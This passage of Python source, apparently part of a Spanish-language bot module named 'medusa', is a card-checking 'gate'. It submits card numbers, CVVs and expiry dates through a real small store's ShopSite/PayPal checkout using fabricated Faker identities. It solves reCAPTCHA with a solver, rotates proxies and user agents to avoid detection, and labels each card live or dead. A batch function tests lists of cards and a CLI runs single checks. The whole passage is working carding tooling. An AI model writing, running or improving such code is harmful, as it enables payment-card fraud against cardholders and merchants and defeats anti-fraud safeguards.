        _log_real(f"billing OK wo={bill.get('WO8233', '?')[:8]} sitekey=...{sitekey[-6:]}")

        # 5. reCAPTCHA v2.
        captcha = _captcha_token(billing_url, sitekey)
        if not captcha:
            return _gate_error("captcha sin solver")

        # 6. thankyou.cgi con billing + tarjeta (Faker).
        payload = {
            "sbid": sbid,
            "storeid": storeid,
            "fromid": "billing.cgi",
            "j_script": "10",
            "frombilling": "yes",
            "rnd1": bill.get("rnd1", state.get("rnd1", "")),
            "rnd2": bill.get("rnd2", state.get("rnd2", "")),
            "tax": bill.get("tax", "1"),
            "Comments": "",
            "Email": ident["email"],
            "First": ident["first"],
            "Last": ident["last"],
            "Company": "",
            "Address": ident["street"],
            "City": ident["city"],
            "State": ident["state"],
            "Zip": ident["zip"],
            "Country": ident["country"],
            "Phone": ident["phone"],
            "usebilling": "on",
            "paytype": paytype,
            "pay1": pan,
            "cvv2": cvv,
            "pay2": ident["full"],
            "pay3": ident["full"],
            "pay4_1": mm,
            "pay4_2": aaaa,
            "meta_web_form_id": bill.get("meta_web_form_id", "2046229731"),
            "meta_split_id": "",
            "listname": bill.get("listname", "awlist6258373"),
            "redirect": bill.get(
                "redirect", "https://www.aweber.com/thankyou-coi.htm?m=text"
            ),
            "meta_adtracking": bill.get(
                "meta_adtracking", "Sign_up_list_for_our_e-Vedanta_Newsletter"
            ),
            "meta_message": "1",
            "meta_required": "name,email",
            "meta_tooltip": "",
            "name": ident["full"],
            "email": ident["email"],
            "g-recaptcha-response": captcha,
            "function": "Submit this Order",
        }
        if "WO8233" in bill:
            payload["WO8233"] = bill["WO8233"]
        rt = _post_form(session, THANKYOU_CGI, payload, billing_url)
        if rt.status_code not in (200, 302):
            return _gate_error(f"thankyou HTTP {rt.status_code}")

        # 8. Billing final -> veredicto. El 302 trae Location RELATIVO
        # (billing.cgi?...) que hay que resolver contra BASE. Si el POST
        # no trae 302 ni Location (el servidor a veces responde 200 con
        # el cuerpo vacio), se sigue directo al billing con el shopinfo
        # conocido: nunca se devuelve vacio sin intentarlo.
        #
        # OJO: el billing con el FORMULARIO DE PAGO tambien contiene la
        # palabra "pay1" (name="pay1"). Por eso AQUI no se usa "pay1" como
        # senal: solo el bloque "Payment Processing Error" indica que ya
        # hay veredicto; en cualquier otro caso se sigue el redirect.
        final_html = rt.text or ""
        final_status = rt.status_code
        final_loc = ""
        if "Payment Processing Error" not in final_html:
            loc = _header(rt, "Location")
            final_loc = loc
            final_url = ""
            if loc:
                if loc.startswith("http"):
                    final_url = loc
                elif loc.startswith("/"):
                    final_url = BASE + loc
                else:
                    final_url = BILLING_CGI.rsplit("/", 1)[0] + "/" + loc
            else:
                final_url = (
                    f"{BILLING_CGI}?storeid={storeid}"
                    f"&shopinfo={sbid}&fromid=thankyou.cgi"
                )
                _log_real("thankyou sin Location: sigo al billing por shopinfo")
            rg = session.get(
                final_url,
                headers={"Referer": billing_url},
                timeout=MEDUSA_TIMEOUT,
            )
            final_status = rg.status_code
            final_html = rg.text or final_html
        _log_real(
            f"thankyou -> {final_status} loc={final_loc[:160]} "
            f"final_len={len(final_html)}"
        )
        try:
            with open(
                "/tmp/opencode/medusa_last_final.html", "w", encoding="utf-8"
            ) as _fh:
                _fh.write(final_html)
        except Exception:
            pass
        result = _classify_verdict(final_html)
        result["elapsed"] = elapsed()
        masked = f"{pan[:6]}******{pan[-4:]}"
        _log_real(
            f"tarjeta {masked} -> {result['status']} "
            f"[{result.get('classification')}] code={result.get('code', '')[:60]} "
            f"en {result['elapsed']}s"
        )
        return result
    except Exception as exc:
        return _gate_error(f"{type(exc).__name__}: {str(exc)[:150]}")
    finally:
        try:
            session.close()
        except Exception:
            pass


# ─────────────────────────────────────────────────────────────
# API PARA HADES
# ─────────────────────────────────────────────────────────────
async def medusa_gate_check(
    card_data: str,
    user_id: Optional[int] = None,
) -> Dict[str, Any]:
    """Verifica 1 tarjeta contra Vedanta ShopSite (PayPal server-side)."""
    card = _normalize_card(card_data)
    if card is None:
        raw = (card_data or "").strip()
        digits = re.sub(r"\D", "", raw.split("|")[0] if "|" in raw else raw)
        if digits and digits[0] not in ("4", "5", "6"):
            return {
                "status": "⚠️ Error",
                "classification": "ERROR",
                "message": USER_ERROR_MSG,
                "code": "marca no soportada",
                "elapsed": 0.0,
            }
        return {
            "status": "❌ Dead",
            "classification": "DEAD FORMATO",
            "message": "Formato invalido. Usa cc|mes|año|cvv",
            "code": "",
            "elapsed": 0.0,
        }

    proxy_url = _pick_proxy()
    if not proxy_url:
        return _gate_error("sin proxy disponible (salida directa prohibida)")

    async with _GATE_SEM:
        loop = asyncio.get_running_loop()
        try:
            return await loop.run_in_executor(None, _flow, card, proxy_url)
        except Exception as exc:
            return _gate_error(f"executor: {type(exc).__name__}: {exc}")


async def medusa_gate_check_multiple(
    cards_data: List[str],
    callback: Optional[Callable[[int, Dict[str, Any], str, int], Any]] = None,
    user_id: Optional[int] = None,
) -> List[Dict[str, Any]]:
    """Verifica un lote de tarjetas en serie (sesion y proxy frescos por tarjeta)."""
    cards = [(c or "").strip() for c in (cards_data or []) if (c or "").strip()][:10]
    results: List[Dict[str, Any]] = []
    for i, raw in enumerate(cards):
        try:
            res = await medusa_gate_check(raw, user_id)
        except Exception as exc:
            _log_real(f"mass error: {type(exc).__name__}")
            res = {
                "status": "⚠️ Error",
                "classification": "ERROR",
                "message": USER_ERROR_MSG,
                "code": "",
                "elapsed": 0.0,
            }
        results.append(res)
        if callback:
            try:
                await callback(i, res, raw, user_id or 0)
            except Exception as exc:
                _log_real(f"callback error: {type(exc).__name__}")
        if i < len(cards) - 1:
            await asyncio.sleep(3)
    return results


# ─────────────────────────────────────────────────────────────
# SONDA STANDALONE (sin tarjeta: valida producto -> carrito -> billing)
# ─────────────────────────────────────────────────────────────
def medusa_probe(proxy_url: str) -> Dict[str, Any]:
    """Replica el flujo hasta el billing sin tarjeta ni captcha.

    Devuelve diagnostico para saber si el checkout avanza (el captcha
    es el unico paso que no se puede probar sin solver).
    """
    ua_entry = _pick_ua()
    session = _new_session(proxy_url, ua_entry)
    nav_referer = BASE + "/store/OnSale.php"
    out: Dict[str, Any] = {"ua": ua_entry["ua"][:60]}
    try:
        r = session.get(
            PRODUCT_URL,
            headers={"Referer": nav_referer, "Sec-Fetch-Site": "same-origin"},
            timeout=MEDUSA_TIMEOUT,
        )
        out["producto"] = r.status_code
        nav_referer = PRODUCT_URL
        if r.status_code != 200:
            return out
        form = None
        for candidate in re.finditer(r"(?is)<form.*?</form>", r.text):
            if re.search(
                rf'name="itemnum" value="{re.escape(ITEMNUM)}"',
                candidate.group(0),
            ):
                form = candidate
                break
        if not form:
            out["form_add"] = False
            return out
        out["form_add"] = True
        hiddens = _hidden_inputs(form.group(0))
        storeid = hiddens.get("storeid", STOREID_FALLBACK)
        out["storeid"] = storeid
        add_data = dict(hiddens)
        add_data[f"{ITEMNUM}:qnty"] = ADD_QTY

        r = _post_form(session, ORDER_CGI, add_data, nav_referer)
        out["add"] = r.status_code
        loc_add = _header(r, "Location")
        out["add_loc"] = (loc_add[:120] if loc_add else "")
        if r.status_code != 302 or not loc_add:
            return out
        r = session.get(
            loc_add, headers={"Referer": nav_referer}, timeout=MEDUSA_TIMEOUT,
            allow_redirects=False,
        )
        out["cart_redirect"] = r.status_code
        loc_cart = _header(r, "Location")
        cart = session.get(
            loc_cart, headers={"Referer": loc_add}, timeout=MEDUSA_TIMEOUT,
        )
        out["carrito"] = cart.status_code
        nav_referer = ORDER_CGI
        cart_html = cart.text or ""
        state = _hidden_inputs(cart_html)
        sbid = state.get("sbid", "")
        if not sbid:
            sbid = _pick(r"[?&]sbid=([^&\"'<>]+)", loc_cart)
        out["sbid"] = bool(sbid)
        if not sbid:
            return out

        def step(extra: Dict[str, str]) -> str:
            data = _form_fields(page_html[0])
            data.update(state)
            data.update(extra)
            rr = _post_form(session, ORDER_CGI, data, nav_referer)
            body = rr.text or ""
            if body:
                page_html[0] = body
                fresh = _hidden_inputs(body)
                if fresh.get("sbid"):
                    state.update(fresh)
            return body

        page_html = [cart.text or ""]
        ident = _faker_identity()
        out["zip"] = ident["zip"]
        # Checkout directo con la cantidad minima ($5): igual que el flujo.
        p3 = step({
            "0:qnty": CHECKOUT_QTY, "country": "US", "j_script": "10",
            "zip_code": ident["zip"],
            "shipping": SHIPPING, "orderinst": "Send", "function": "Checkout",
        })
        out["zip_change_len"] = 0
        out["checkout_len"] = len(p3)
        out["billing_en_checkout"] = ("pay1" in p3)
        rb = session.get(
            BILLING_CGI,
            params={"storeid": storeid, "fromid": "order.cgi",
                    "redirect": "yes", "shopinfo": state.get("sbid", "")},
            headers={"Referer": nav_referer},
            timeout=MEDUSA_TIMEOUT,
        )
        out["billing_get"] = rb.status_code
        out["billing_con_form"] = ("pay1" in (rb.text or ""))
        out["billing_len"] = len(rb.text or "")
        return out
    except Exception as exc:
        out["excepcion"] = f"{type(exc).__name__}: {str(exc)[:150]}"
        return out
    finally:
        try:
            session.close()
        except Exception:
            pass


# ─────────────────────────────────────────────────────────────
# CLI de prueba (fuera del bot)
# ─────────────────────────────────────────────────────────────
if __name__ == "__main__":  # pragma: no cover
    import sys

    if len(sys.argv) < 5:
        print("uso: python -m bot.gates.medusa <numero> <mm> <yy> <cvc>")
        sys.exit(2)

    card = _normalize_card("|".join(sys.argv[1:5]))
    if card is None:
        print("[x] tarjeta inválida o marca no soportada")
        sys.exit(2)

    proxy = _pick_proxy()
    print(f"proxy: {'OK' if proxy else 'AUSENTE (se aborta)'}")
    if not proxy:
        sys.exit(2)
    print(_flow(card, proxy))
